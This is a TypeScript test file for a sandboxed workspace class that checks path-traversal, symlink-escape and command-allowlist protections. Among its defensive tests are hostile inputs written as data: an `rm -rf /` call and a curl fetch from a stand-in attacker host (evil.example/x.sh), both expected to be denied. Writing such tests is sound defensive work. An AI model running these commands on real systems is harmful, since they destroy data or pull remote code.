import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtemp, rm, readFile, mkdir, writeFile, symlink } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { randomUUID } from 'node:crypto'

import { DEFAULT_ALLOWED_COMMANDS, LocalWorkspace } from '../local-workspace.js'
import {
  WorkspaceCommandDeniedError,
  WorkspacePathSecurityError,
  type WorkspaceOptions,
} from '../types.js'

describe('LocalWorkspace', () => {
  let tempDir: string
  let ws: LocalWorkspace

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), `lw-test-${randomUUID()}-`))
    const opts: WorkspaceOptions = {
      rootDir: tempDir,
      search: { provider: 'builtin' },
      command: {
        timeoutMs: 5_000,
        allowedCommands: ['echo', 'cat', 'ls', 'node'],
      },
    }
    ws = new LocalWorkspace(opts)
  })

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true })
  })

  // ---- readFile -----------------------------------------------------------

  it('readFile returns file contents', async () => {
    await writeFile(join(tempDir, 'hello.txt'), 'hello world', 'utf-8')
    const content = await ws.readFile('hello.txt')
    expect(content).toBe('hello world')
  })

  it('readFile throws for missing file', async () => {
    await expect(ws.readFile('does-not-exist.txt')).rejects.toThrow()
  })

  it('readFile rejects absolute paths', async () => {
    await expect(ws.readFile(join(tempDir, 'hello.txt'))).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  it('readFile rejects traversal outside root', async () => {
    await expect(ws.readFile('../outside.txt')).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  it('readFile rejects symlink escapes outside root', async () => {
    const outsideDir = await mkdtemp(join(tmpdir(), `lw-outside-${randomUUID()}-`))
    try {
      await writeFile(join(outsideDir, 'secret.txt'), 'secret', 'utf-8')
      await symlink(join(outsideDir, 'secret.txt'), join(tempDir, 'linked-secret.txt'))

      await expect(ws.readFile('linked-secret.txt')).rejects.toBeInstanceOf(
        WorkspacePathSecurityError,
      )
    } finally {
      await rm(outsideDir, { recursive: true, force: true })
    }
  })

  // ---- writeFile ----------------------------------------------------------

  it('writeFile creates a new file', async () => {
    await ws.writeFile('output.txt', 'created')
    const content = await readFile(join(tempDir, 'output.txt'), 'utf-8')
    expect(content).toBe('created')
  })

  it('writeFile creates parent directories as needed', async () => {
    await ws.writeFile('deep/nested/dir/file.ts', 'export const x = 1')
    const content = await readFile(join(tempDir, 'deep/nested/dir/file.ts'), 'utf-8')
    expect(content).toBe('export const x = 1')
  })

  it('writeFile rejects absolute paths', async () => {
    await expect(ws.writeFile(join(tempDir, 'output.txt'), 'created')).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  it('writeFile rejects traversal outside root', async () => {
    await expect(ws.writeFile('../outside.txt', 'created')).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  it('writeFile rejects symlinked parent directories outside root', async () => {
    const outsideDir = await mkdtemp(join(tmpdir(), `lw-outside-${randomUUID()}-`))
    try {
      await symlink(outsideDir, join(tempDir, 'linked-dir'))

      await expect(ws.writeFile('linked-dir/new.txt', 'created')).rejects.toBeInstanceOf(
        WorkspacePathSecurityError,
      )
    } finally {
      await rm(outsideDir, { recursive: true, force: true })
    }
  })

  // ---- listFiles ----------------------------------------------------------

  it('listFiles matches *.ts glob at root', async () => {
    await ws.writeFile('index.ts', 'export {}')
    await ws.writeFile('readme.md', '# Hi')
    const files = await ws.listFiles('*.ts')
    expect(files).toContain('index.ts')
    expect(files).not.toContain('readme.md')
  })

  it('listFiles matches **/*.ts recursively', async () => {
    await ws.writeFile('src/a.ts', 'a')
    await ws.writeFile('src/lib/b.ts', 'b')
    await ws.writeFile('src/lib/c.js', 'c')
    const files = await ws.listFiles('**/*.ts')
    expect(files).toContain('src/a.ts')
    expect(files).toContain('src/lib/b.ts')
    expect(files).not.toContain('src/lib/c.js')
  })

  it('listFiles rejects absolute and traversal globs', async () => {
    await expect(ws.listFiles('/tmp/**/*.ts')).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
    await expect(ws.listFiles('../*.ts')).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  // ---- search (builtin) ---------------------------------------------------

  it('search finds text matches across files', async () => {
    await ws.writeFile('a.ts', 'const foo = 1\nconst bar = 2')
    await ws.writeFile('b.ts', 'const baz = 3')
    const results = await ws.search('const bar')
    expect(results.length).toBe(1)
    expect(results[0]!.matchText).toBe('const bar')
    expect(results[0]!.line).toBe(2)
  })

  it('search rejects absolute and traversal globs', async () => {
    await expect(ws.search('const', { glob: '/tmp/**/*.ts' })).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
    await expect(ws.search('const', { glob: '../*.ts' })).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  // ---- runCommand ---------------------------------------------------------

  it('runCommand captures stdout', async () => {
    const result = await ws.runCommand('echo', ['hello'])
    expect(result.exitCode).toBe(0)
    expect(result.stdout.trim()).toBe('hello')
    expect(result.timedOut).toBe(false)
  })

  it('runCommand captures stderr and non-zero exit code', async () => {
    const result = await ws.runCommand('cat', ['does-not-exist.txt'])
    expect(result.exitCode).not.toBe(0)
    expect(result.stderr).toContain('does-not-exist.txt')
  })

  it('runCommand throws WorkspaceCommandDeniedError for disallowed commands', async () => {
    await expect(ws.runCommand('rm', ['-rf', '/'])).rejects.toBeInstanceOf(
      WorkspaceCommandDeniedError,
    )
  })

  it('runCommand falls back to DEFAULT_ALLOWED_COMMANDS when no allowlist is configured', async () => {
    const defaultsWorkspace = new LocalWorkspace({
      rootDir: tempDir,
      search: { provider: 'builtin' },
    })

    expect(defaultsWorkspace.options.command?.allowedCommands).toEqual([
      ...DEFAULT_ALLOWED_COMMANDS,
    ])
  })

  it('runCommand denies networked binaries (curl) under the default allowlist', async () => {
    const defaultsWorkspace = new LocalWorkspace({
      rootDir: tempDir,
      search: { provider: 'builtin' },
    })

    await expect(
      defaultsWorkspace.runCommand('curl', ['https://evil.example/x.sh']),
    ).rejects.toBeInstanceOf(WorkspaceCommandDeniedError)
  })

  it('runCommand allows git under the default allowlist (git status succeeds)', async () => {
    const defaultsWorkspace = new LocalWorkspace({
      rootDir: tempDir,
      search: { provider: 'builtin' },
      command: { timeoutMs: 5_000 },
    })

    // `git status` may exit non-zero (not a repo) but must NOT throw
    // WorkspaceCommandDeniedError — it must be allowed past the gate.
    const result = await defaultsWorkspace.runCommand('git', ['status'])
    expect(result).toMatchObject({ timedOut: false })
    expect(typeof result.exitCode).toBe('number')
  })

  it('runCommand allows curl when explicitly listed in allowedCommands', async () => {
    const curlWorkspace = new LocalWorkspace({
      rootDir: tempDir,
      search: { provider: 'builtin' },
      // `--help` is universally available and exits 0 across curl distros.
      command: { timeoutMs: 5_000, allowedCommands: ['curl'] },
    })

    // We intentionally do not hit the network — `--help` is offline.
    // The point of the test is that the allowlist gate does not deny `curl`.
    let denied = false
    try {
      await curlWorkspace.runCommand('curl', ['--help'])
    } catch (err) {
      if (err instanceof WorkspaceCommandDeniedError) denied = true
    }
    expect(denied).toBe(false)
  })

  it("runCommand allows any command when allowedCommands is the '*' sentinel", async () => {
    const wildcardWorkspace = new LocalWorkspace({
      rootDir: tempDir,
      search: { provider: 'builtin' },
      command: { timeoutMs: 5_000, allowedCommands: '*' },
    })

    // `node --version` is allowed because of '*'; if the gate denied it we
    // would see WorkspaceCommandDeniedError. We only care that it's not denied.
    let denied = false
    try {
      await wildcardWorkspace.runCommand('node', ['--version'])
    } catch (err) {
      if (err instanceof WorkspaceCommandDeniedError) denied = true
    }
    expect(denied).toBe(false)
  })

  it('runCommand rejects cwd outside root', async () => {
    await expect(ws.runCommand('echo', ['hello'], { cwd: '../outside' })).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
    await expect(ws.runCommand('echo', ['hello'], { cwd: tmpdir() })).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  it('runCommand rejects symlinked cwd outside root', async () => {
    const outsideDir = await mkdtemp(join(tmpdir(), `lw-outside-${randomUUID()}-`))
    try {
      await symlink(outsideDir, join(tempDir, 'linked-dir'))

      await expect(ws.runCommand('echo', ['hello'], { cwd: 'linked-dir' })).rejects.toBeInstanceOf(
        WorkspacePathSecurityError,
      )
    } finally {
      await rm(outsideDir, { recursive: true, force: true })
    }
  })

  // ---- exists -------------------------------------------------------------

  it('exists returns true for an existing file', async () => {
    await ws.writeFile('present.txt', 'yes')
    expect(await ws.exists('present.txt')).toBe(true)
  })

  it('exists returns false for a missing path', async () => {
    expect(await ws.exists('ghost.txt')).toBe(false)
  })

  it('exists rejects absolute and traversal paths', async () => {
    await expect(ws.exists(join(tempDir, 'present.txt'))).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
    await expect(ws.exists('../present.txt')).rejects.toBeInstanceOf(
      WorkspacePathSecurityError,
    )
  })

  it('exists rejects symlink escapes outside root', async () => {
    const outsideDir = await mkdtemp(join(tmpdir(), `lw-outside-${randomUUID()}-`))
    try {
      await writeFile(join(outsideDir, 'secret.txt'), 'secret', 'utf-8')
      await symlink(join(outsideDir, 'secret.txt'), join(tempDir, 'linked-secret.txt'))

      await expect(ws.exists('linked-secret.txt')).rejects.toBeInstanceOf(
        WorkspacePathSecurityError,
      )
    } finally {
      await rm(outsideDir, { recursive: true, force: true })
    }
  })
})
